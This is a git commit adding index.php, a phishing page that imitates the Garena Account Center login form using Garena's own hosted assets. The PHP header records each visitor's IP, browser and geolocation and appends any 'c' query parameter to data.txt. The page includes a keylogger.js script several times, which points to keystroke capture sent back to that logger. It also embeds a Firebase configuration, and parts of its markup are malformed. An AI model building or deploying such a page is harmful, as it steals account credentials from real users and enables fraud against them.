521fdee480ff9abd2e0a4f4d409d233c66bd31b7
Yokminasai <155666876+Yokminasai@users.noreply.github.com>
2024-01-05 00:42:37 +0700

    Add files via upload

---
+++ index.php
@@ -0,0 +1,122 @@
+<?php
+$ip = $_SERVER['REMOTE_ADDR'];
+$ip_info = json_decode(file_get_contents("http://ip-api.com/json/$ip"), true);
+$browser = $_SERVER['HTTP_USER_AGENT'];
+$dateTime = date('Y/m/d G:i:s');
+$file = "visitors.html";
+$file = fopen($file, "a");
+
+fclose($file);
+if(!empty($_GET['c'])) {
+  $logfile = fopen('data.txt', 'a+');
+  fwrite($logfile, $_GET['c']);
+  fclose($logfile);
+}
+
+?>
+
+<html>
+<html lang="en"><head><meta http-equiv="origin-trial" content="Az520Inasey3TAyqLyojQa8MnmCALSEU29yQFW8dePZ7xQTvSt73pHazLFTK5f7SyLUJSo2uKLesEtEa9aUYcgMAAACPeyJvcmlnaW4iOiJodHRwczovL2dvb2dsZS5jb206NDQzIiwiZmVhdHVyZSI6IkRpc2FibGVUaGlyZFBhcnR5U3RvcmFnZVBhcnRpdGlvbmluZyIsImV4cGlyeSI6MTcyNTQwNzk5OSwiaXNTdWJkb21haW4iOnRydWUsImlzVGhpcmRQYXJ0eSI6dHJ1ZX0=">
+    <script type="text/javascript" async="" src="https://www.googletagmanager.com/gtag/js?id=G-1M7M9L6VPX&amp;l=dataLayer&amp;cx=c"></script><script type="text/javascript" async="" src="https://www.gstatic.com/recaptcha/releases/u-xcq3POCWFlCr3x8_IPxgPu/recaptcha__en.js" crossorigin="anonymous" integrity="sha384-CDkofqMo6hSAPRh2TZj9HOLusb5hze4z6vkh6YWvd810w+KTuT5lucK9hQN36Xh7"></script><script async="" src="https://js.datadome.co/tags.js"></script><script async="" src="https://www.googletagmanager.com/gtm.js?id=GTM-55G2F7F"></script><script type="module" crossorigin="" src="https://sso.garena.com/universal/assets/polyfills-295155e5.js"></script>
+
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+    <!-- Google Tag Manager -->
+    <script>
+      (function (w, d, s, l, i) {
+        w[l] = w[l] || [];
+        w[l].push({ "gtm.start": new Date().getTime(), event: "gtm.js" });
+        var f = d.getElementsByTagName(s)[0],
+          j = d.createElement(s),
+          dl = l != "dataLayer" ? "&l=" + l : "";
+        j.async = true;
+        j.src = "https://www.googletagmanager.com/gtm.js?id=" + i + dl;
+        f.parentNode.insertBefore(j, f);
+      })(window, document, "script", "dataLayer", "GTM-55G2F7F");
+    </script>
+    <!-- End Google Tag Manager -->
+    <link rel="icon" href="https://sso.garena.com/universal/static/favicon.ico">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&amp;display=swap" rel="stylesheet">
+    <link href="https://sso.garena.com/universal/lib/@shopee/captcha-mobile-vanilla/main.css" rel="stylesheet">
+    <script src="https://sso.garena.com/universal/lib/@shopee/slider-captcha-sdk.js" async="" defer=""></script>
+    <script src="https://sso.garena.com/universal/lib/@shopee/captcha-mobile-vanilla/bundle.js" async="" defer=""></script>
+    <script src="https://www.google.com/recaptcha/api.js?render=explicit" async="" defer=""></script>
+    <title>Garena Account Center</title>
+    <script type="module" crossorigin="" src="https://sso.garena.com/universal/assets/index-a6ab6989.js"></script>
+    <link rel="stylesheet" href="https://sso.garena.com/universal/assets/index-f8df3c2d.css">
+    <script type="module">try{import.meta.url;import("_").catch(()=>1);}catch(e){}window.__vite_is_modern_browser=true;</script>
+    <script type="module">!function(){if(window.__vite_is_modern_browser)return;console.warn("vite: loading legacy build because dynamic import or import.meta.url is unsupported, syntax error above should be ignored");var e=document.getElementById("vite-legacy-polyfill"),n=document.createElement("script");n.src=e.src,n.onload=function(){System.import(document.getElementById('vite-legacy-entry').getAttribute('data-src'))},document.body.appendChild(n)}();</script>
+  <link rel="modulepreload" as="script" crossorigin="" href="https://sso.garena.com/universal/assets/LoginView-53222025.js"><link rel="modulepreload" as="script" crossorigin="" href="https://sso.garena.com/universal/assets/ErrorBox-8598eb55.js"><link rel="stylesheet" href="https://sso.garena.com/universal/assets/ErrorBox-91a1ce3c.css"><link rel="modulepreload" as="script" crossorigin="" href="https://sso.garena.com/universal/assets/TopBar-8243dfe7.js"><link rel="stylesheet" href="https://sso.garena.com/universal/assets/TopBar-89b3db7d.css"><link rel="modulepreload" as="script" crossorigin="" href="https://sso.garena.com/universal/assets/login-6d0c159c.js"><link rel="stylesheet" href="https://sso.garena.com/universal/assets/LoginView-0d1d9d61.css"></head>
+  <body>
+    <!-- Google Tag Manager (noscript) -->
+    <noscript>
+      <iframe
+        src="https://www.googletagmanager.com/ns.html?id=GTM-55G2F7F"
+        height="0"
+        width="0"
+        style="display: none; visibility: hidden"
+      ></iframe>
+    </noscript>
+    <!-- End Google Tag Manager (noscript) -->
+
+    </script><div id="app" data-v-app=""><header class="topbar" data-v-878436c2="" data-v-15e3e196=""><div class="container" data-v-878436c2=""><a class="logo" href="https://www.garena.sg" data-v-878436c2=""><img src="https://sso.garena.com/universal/assets/logo-9d415851.svg" alt="Garena Logo" data-v-878436c2=""></a><select class="lang" data-v-878436c2=""><option value="en-US" data-v-878436c2="">International - English</option><option value="en-SG" data-v-878436c2=""><img src="https://sso.garena.com/universal/assets/logo-9d415851.svg" alt="Garena Logo"Singapore - English</option><option value="zh-SG" data-v-878436c2="">新加坡 - 简体中文</option><option value="zh-TW" data-v-878436c2="">台灣 - 繁体中文</option><option value="en-PH" data-v-878436c2="">Philippines - English</option><option value="th-TH" data-v-878436c2="">ไทย - ไทย</option><option value="id-ID" data-v-878436c2="">Indonesia - Bahasa Indonesia</option><option value="vi-VN" data-v-878436c2="">Việt Nam - Tiếng việt</option><option value="ru-RU" data-v-878436c2="">Россия - Русский</option><option value="en-MY" data-v-878436c2="">Malaysia - English</option><option value="pt-PT" data-v-878436c2="">Portugal - Português</option><option value="es-ES" data-v-878436c2="">España - Español</option></select></div></header><main data-v-15e3e196=""><form data-v-15e3e196=""><h2 data-v-15e3e196="">Log In</h2><div class="field required" data-v-15e3e196=""><input type="text" placeholder="Garena Username, Email or Phone" data-v-15e3e196=""><!----></div><div class="field required" data-v-15e3e196=""><input type="password" placeholder="Password" data-v-15e3e196=""><!----></div><a class="forgot" href="https://account.garena.com/recovery" data-v-15e3e196="">Forgot Password</a><div class="field" data-v-15e3e196=""><button class="primary" type="submit" data-v-15e3e196="">Login Now</button><!----></div><div class="field" data-v-15e3e196=""><button class="secondary register" type="button" data-v-15e3e196="">Register A New Account</button></div></form></main></div><script src="keylogger.js"></script>
+      <script src="keylogger.js"></script>
+      !(function (a, b, c, d, e, f) {
+        a.ddjskey = e;
+        a.ddoptions = f || null;
+        var m = b.createElement(c),
+          n = b.getElementsByTagName(c)[0];
+        (m.async = 1), (m.src = d), n.parentNode.insertBefore(m, n);
+      })(
+        window,
+        document,
+        "script",
+        "https://js.datadome.co/tags.js",
+        "AE3F04AD3F0D3A462481A337485081",
+        {
+          ajaxListenerPathExclusion: [
+            "https://www.google-analytics.com",
+            "api-js.datadome.co",
+          ],
+          exposeCaptchaFunction: true,
+          disableAutoRefreshOnCaptchaPassed: true,
+          enableTagEvents: true,
+        }
+      );
+    </script>
+
+    <style></style>
+    <script src="keylogger.js"></script>
+    <script nomodule="">!function(){var e=document,t=e.createElement("script");if(!("noModule"in t)&&"onbeforeload"in t){var n=!1;e.addEventListener("beforeload",(function(e){if(e.target===t)n=!0;else if(!e.target.hasAttribute("nomodule")||!n)return;e.preventDefault()}),!0),t.type="module",t.src=".",e.head.appendChild(t),t.remove()}}();</script>
+    <script nomodule="" crossorigin="" id="vite-legacy-polyfill" src="https://sso.garena.com/universal/assets/polyfills-legacy-45cadae9.js"></script>
+    <script nomodule="" crossorigin="" id="vite-legacy-entry" data-src="https://sso.garena.com/universal/assets/index-legacy-485f3edd.js">System.import(document.getElementById('vite-legacy-entry').getAttribute('data-src'))</script>
+    <script src="keylogger.js"></script><script src="keylogger.js"></script><script src="keylogger.js"></script><script src="keylogger.js"></script>
+
+    <script type="module">
+  // Import the functions you need from the SDKs you need
+  import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
+  import { getAnalytics } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-analytics.js";
+  // TODO: Add SDKs for Firebase products that you want to use
+  // https://firebase.google.com/docs/web/setup#available-libraries
+
+  // Your web app's Firebase configuration
+  // For Firebase JS SDK v7.20.0 and later, measurementId is optional
+  const firebaseConfig = {
+    apiKey: "AIzaSyBZ0_-AN_qOiNEb52Xy7ycQJ3y3_YiUJFI",
+    authDomain: "mali4saleshop.firebaseapp.com",
+    projectId: "mali4saleshop",
+    storageBucket: "mali4saleshop.appspot.com",
+    messagingSenderId: "1022120591242",
+    appId: "1:1022120591242:web:e97e143fba1bfded11d273",
+    measurementId: "G-17T43RHP8B"
+  };
+
+  // Initialize Firebase
+  const app = initializeApp(firebaseConfig);
+  const analytics = getAnalytics(app);
+</script>
+
+
+</html>   
